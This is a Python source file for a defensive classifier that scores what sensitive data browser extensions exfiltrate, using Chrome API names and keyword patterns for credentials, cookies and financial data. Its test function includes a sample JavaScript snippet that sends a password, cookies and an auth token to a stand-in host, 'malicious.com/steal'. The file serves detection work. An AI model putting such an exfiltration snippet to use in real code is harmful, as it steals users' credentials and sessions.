"""
PII/Data Classification System
Classifies what sensitive data is being exfiltrated by extensions
"""

import re


class PIIClassifier:
    """Classify sensitive data types being accessed or exfiltrated"""

    # PII Classification Matrix
    PII_CLASSIFICATION = {
        'CREDENTIALS': {
            'chrome_apis': ['cookies', 'webRequest', 'webRequestBlocking'],
            'patterns': [
                r'password', r'passwd', r'pwd', r'login', r'auth',
                r'token', r'session', r'bearer', r'jwt', r'api[_-]?key',
                r'access[_-]?token', r'refresh[_-]?token', r'csrf',
                r'credential', r'secret', r'private[_-]?key'
            ],
            'risk': 'CRITICAL',
            'severity_score': 10,
            'description': 'Account takeover, identity theft, unauthorized access',
            'impact': 'Attacker gains full access to user accounts and services'
        },
        'FINANCIAL': {
            'chrome_apis': ['cookies', 'webRequest'],
            'patterns': [
                r'payment', r'credit[_-]?card', r'card[_-]?number', r'cvv', r'cvc',
                r'paypal', r'banking', r'bank[_-]?account', r'routing[_-]?number',
                r'wallet', r'transaction', r'invoice', r'billing',
                r'stripe', r'visa', r'mastercard', r'amex'
            ],
            'risk': 'CRITICAL',
            'severity_score': 10,
            'description': 'Financial fraud, unauthorized transactions, identity theft',
            'impact': 'Direct financial loss and potential identity fraud'
        },
        'PERSONAL_INFO': {
            'chrome_apis': ['history', 'tabs', 'cookies', 'identity'],
            'patterns': [
                r'email', r'e-mail', r'address', r'phone', r'mobile',
                r'ssn', r'social[_-]?security', r'full[_-]?name', r'first[_-]?name',
                r'last[_-]?name', r'birthday', r'birth[_-]?date', r'dob',
                r'passport', r'driver[_-]?license', r'national[_-]?id'
            ],
            'risk': 'HIGH',
            'severity_score': 8,
            'description': 'Privacy violation, doxxing, targeted attacks',
            'impact': 'Exposure of personally identifiable information'
        },
        'BROWSING_HISTORY': {
            'chrome_apis': ['history', 'tabs', 'topSites'],
            'patterns': [
                r'url', r'location', r'history', r'visit', r'site',
                r'navigation', r'page[_-]?view', r'referrer', r'browser'
            ],
            'risk': 'HIGH',
            'severity_score': 7,
            'description': 'User profiling, privacy violation, surveillance',
            'impact': 'Complete browsing behavior exposed for profiling and tracking'
        },
        'COOKIES_SESSIONS': {
            'chrome_apis': ['cookies'],
            'patterns': [
                r'cookie', r'session[_-]?id', r'sid', r'phpsessid',
                r'jsessionid', r'asp\.net[_-]?sessionid', r'session[_-]?token',
                r'remember[_-]?me', r'keep[_-]?logged'
            ],
            'risk': 'HIGH',
            'severity_score': 8,
            'description': 'Session hijacking, account takeover',
            'impact': 'Attacker can impersonate user without credentials'
        },
        'EMAIL_CONTENT': {
            'chrome_apis': ['tabs', 'webRequest'],
            'patterns': [
                r'email[_-]?content', r'message[_-]?body', r'subject',
                r'sender', r'recipient', r'inbox', r'draft',
                r'compose', r'reply'
            ],
            'risk': 'HIGH',
            'severity_score': 7,
            'description': 'Privacy breach, corporate espionage, blackmail',
            'impact': 'Sensitive communications exposed'
        },
        'FORM_DATA': {
            'chrome_apis': ['webRequest', 'tabs'],
            'patterns': [
                r'form[_-]?data', r'input[_-]?field', r'textarea',
                r'form[_-]?submission', r'post[_-]?data', r'user[_-]?input',
                r'search[_-]?query', r'autocomplete'
            ],
            'risk': 'MEDIUM',
            'severity_score': 6,
            'description': 'Data harvesting, profiling',
            'impact': 'User input across all websites captured'
        },
        'CLIPBOARD': {
            'chrome_apis': ['clipboardRead', 'clipboardWrite'],
            'patterns': [
                r'clipboard', r'copy', r'paste', r'cut'
            ],
            'risk': 'HIGH',
            'severity_score': 7,
            'description': 'Credential theft, sensitive data leak',
            'impact': 'Passwords and sensitive data copied to clipboard exposed'
        },
        'GEOLOCATION': {
            'chrome_apis': ['geolocation'],
            'patterns': [
                r'location', r'latitude', r'longitude', r'coordinates',
                r'geo', r'position', r'gps'
            ],
            'risk': 'MEDIUM',
            'severity_score': 5,
            'description': 'Physical surveillance, stalking',
            'impact': 'User physical location tracked'
        },
        'DEVICE_INFO': {
            'chrome_apis': ['system.cpu', 'system.memory', 'system.storage'],
            'patterns': [
                r'user[_-]?agent', r'device[_-]?id', r'fingerprint',
                r'hardware', r'os[_-]?version', r'browser[_-]?version',
                r'screen[_-]?resolution', r'timezone', r'language'
            ],
            'risk': 'LOW',
            'severity_score': 3,
            'description': 'Device fingerprinting, tracking',
            'impact': 'Unique device identification for tracking'
        }
    }

    def __init__(self):
        """Initialize PII classifier"""
        # Compile regex patterns for efficiency
        self.compiled_patterns = {}
        for category, info in self.PII_CLASSIFICATION.items():
            self.compiled_patterns[category] = [
                re.compile(pattern, re.IGNORECASE) for pattern in info['patterns']
            ]

    def classify_chrome_api(self, api_call):
        """
        Classify data type based on Chrome API usage

        Args:
            api_call: Chrome API call (e.g., 'chrome.cookies.getAll')

        Returns:
            list: Matching PII categories with risk info
        """
        classifications = []

        # Normalize API call
        api_lower = api_call.lower().replace('chrome.', '')

        for category, info in self.PII_CLASSIFICATION.items():
            for chrome_api in info['chrome_apis']:
                if chrome_api in api_lower:
                    classifications.append({
                        'category': category,
                        'risk': info['risk'],
                        'severity_score': info['severity_score'],
                        'description': info['description'],
                        'impact': info['impact'],
                        'detected_via': 'chrome_api',
                        'matched_api': chrome_api
                    })
                    break

        return classifications

    def classify_code_content(self, code_content):
        """
        Classify data type based on code analysis

        Args:
            code_content: Source code or variable names to analyze

        Returns:
            list: Matching PII categories with confidence scores
        """
        classifications = []

        if not code_content:
            return classifications

        code_lower = code_content.lower()

        for category, patterns in self.compiled_patterns.items():
            matches = []
            for pattern in patterns:
                if pattern.search(code_lower):
                    matches.append(pattern.pattern)

            if matches:
                info = self.PII_CLASSIFICATION[category]
                classifications.append({
                    'category': category,
                    'risk': info['risk'],
                    'severity_score': info['severity_score'],
                    'description': info['description'],
                    'impact': info['impact'],
                    'detected_via': 'code_analysis',
                    'matched_patterns': matches[:3],  # Top 3 matches
                    'confidence': min(len(matches) * 0.3, 1.0)  # Simple confidence score
                })

        # Sort by severity
        classifications.sort(key=lambda x: x['severity_score'], reverse=True)

        return classifications

    def classify_exfiltration(self, evidence):
        """
        Comprehensive classification of data exfiltration

        Args:
            evidence: Dictionary with:
                - chrome_apis: List of Chrome API calls
                - code_snippets: List of code snippets
                - destination: Destination URL
                - method: HTTP method

        Returns:
            dict: Complete classification with recommendations
        """
        all_classifications = []

        # Classify based on Chrome APIs
        if evidence.get('chrome_apis'):
            for api in evidence['chrome_apis']:
                api_classifications = self.classify_chrome_api(api)
                all_classifications.extend(api_classifications)

        # Classify based on code content
        if evidence.get('code_snippets'):
            for snippet in evidence['code_snippets']:
                code_classifications = self.classify_code_content(snippet)
                all_classifications.extend(code_classifications)

        # Deduplicate and merge
        unique_categories = {}
        for classification in all_classifications:
            category = classification['category']
            if category not in unique_categories:
                unique_categories[category] = classification
            else:
                # Merge detection methods
                if 'matched_api' in classification:
                    unique_categories[category]['matched_apis'] = \
                        unique_categories[category].get('matched_apis', [])
                    unique_categories[category]['matched_apis'].append(
                        classification['matched_api']
                    )

        # Calculate overall risk
        highest_risk = 'LOW'
        total_severity = 0

        for classification in unique_categories.values():
            total_severity += classification['severity_score']
            if classification['risk'] == 'CRITICAL':
                highest_risk = 'CRITICAL'
            elif classification['risk'] == 'HIGH' and highest_risk != 'CRITICAL':
                highest_risk = 'HIGH'
            elif classification['risk'] == 'MEDIUM' and highest_risk == 'LOW':
                highest_risk = 'MEDIUM'

        # Generate recommendation
        recommendation = self._generate_recommendation(
            highest_risk,
            len(unique_categories),
            total_severity,
            evidence.get('destination')
        )

        return {
            'classifications': list(unique_categories.values()),
            'overall_risk': highest_risk,
            'total_severity_score': total_severity,
            'data_types_count': len(unique_categories),
            'recommendation': recommendation,
            'destination': evidence.get('destination', 'Unknown')
        }

    def _generate_recommendation(self, risk_level, type_count, severity, destination):
        """Generate security recommendation based on risk assessment"""

        if risk_level == 'CRITICAL':
            return {
                'action': 'BLOCK IMMEDIATELY',
                'priority': 'P0 - Critical',
                'rationale': f'Extension exfiltrates {type_count} type(s) of critical data including credentials, financial information, or session tokens. Immediate removal required.',
                'next_steps': [
                    'Uninstall extension immediately',
                    'Reset passwords for all accounts',
                    'Check for unauthorized transactions',
                    'Report to Chrome Web Store',
                    'Run full malware scan'
                ]
            }
        elif risk_level == 'HIGH':
            return {
                'action': 'QUARANTINE AND INVESTIGATE',
                'priority': 'P1 - High',
                'rationale': f'Extension accesses {type_count} type(s) of sensitive personal data. Requires immediate investigation and likely removal.',
                'next_steps': [
                    'Disable extension immediately',
                    'Review extension permissions',
                    'Check network logs for data exfiltration',
                    'Consider reporting to security team',
                    'Evaluate business need vs risk'
                ]
            }
        elif risk_level == 'MEDIUM':
            return {
                'action': 'MONITOR AND RESTRICT',
                'priority': 'P2 - Medium',
                'rationale': f'Extension collects {type_count} type(s) of user data. Monitoring recommended.',
                'next_steps': [
                    "Review extension's stated purpose",
                    'Check if data collection is justified',
                    'Monitor network traffic',
                    'Consider less invasive alternatives',
                    'Document and track behavior'
                ]
            }
        else:
            return {
                'action': 'REVIEW PERIODICALLY',
                'priority': 'P3 - Low',
                'rationale': 'Extension has limited data access. Standard monitoring sufficient.',
                'next_steps': [
                    'Review permissions periodically',
                    'Monitor for permission changes',
                    'Keep extension updated',
                    'Watch for unusual behavior'
                ]
            }


def test_pii_classifier():
    """Test PII classification system"""
    classifier = PIIClassifier()

    print("=" * 80)
    print("PII CLASSIFIER TEST")
    print("=" * 80)

    # Test Chrome API classification
    print("\n1. Testing Chrome API Classification:")
    print("-" * 80)
    test_apis = [
        'chrome.cookies.getAll',
        'chrome.history.search',
        'chrome.tabs.query',
        'chrome.webRequest.onBeforeRequest'
    ]

    for api in test_apis:
        print(f"\nAPI: {api}")
        results = classifier.classify_chrome_api(api)
        for result in results:
            print(f"  Category: {result['category']}")
            print(f"  Risk: {result['risk']} (Score: {result['severity_score']})")
            print(f"  Impact: {result['impact']}")

    # Test code content classification
    print("\n\n2. Testing Code Content Classification:")
    print("-" * 80)
    test_code = """
    const password = getPassword();
    const email = user.email;
    fetch('https://malicious.com/steal', {
        method: 'POST',
        body: JSON.stringify({
            password: password,
            cookies: document.cookie,
            token: localStorage.getItem('auth_token')
        })
    });
    """

    print(f"\nCode snippet analyzed...")
    results = classifier.classify_code_content(test_code)
    for result in results:
        print(f"\n  Category: {result['category']}")
        print(f"  Risk: {result['risk']} (Score: {result['severity_score']})")
        print(f"  Confidence: {result['confidence']:.2f}")
        print(f"  Matched patterns: {', '.join(result['matched_patterns'])}")

    # Test comprehensive exfiltration classification
    print("\n\n3. Testing Comprehensive Exfiltration Classification:")
    print("-" * 80)

    evidence = {
        'chrome_apis': ['chrome.cookies.getAll', 'chrome.history.search'],
        'code_snippets': [test_code],
        'destination': 'https://malicious.com/steal',
        'method': 'POST'
    }

    result = classifier.classify_exfiltration(evidence)

    print(f"\n[!] Data Exfiltration Analysis")
    print(f"Destination: {result['destination']}")
    print(f"Overall Risk: {result['overall_risk']}")
    print(f"Total Severity Score: {result['total_severity_score']}")
    print(f"Data Types Detected: {result['data_types_count']}")

    print(f"\n[DATA TYPES] Classified Data Types:")
    for classification in result['classifications']:
        print(f"\n  • {classification['category']} ({classification['risk']})")
        print(f"    Score: {classification['severity_score']}/10")
        print(f"    Impact: {classification['impact']}")

    print(f"\n[RECOMMENDATION] Recommendation:")
    rec = result['recommendation']
    print(f"  Action: {rec['action']}")
    print(f"  Priority: {rec['priority']}")
    print(f"  Rationale: {rec['rationale']}")
    print(f"\n  Next Steps:")
    for i, step in enumerate(rec['next_steps'], 1):
        print(f"    {i}. {step}")


if __name__ == "__main__":
    test_pii_classifier()
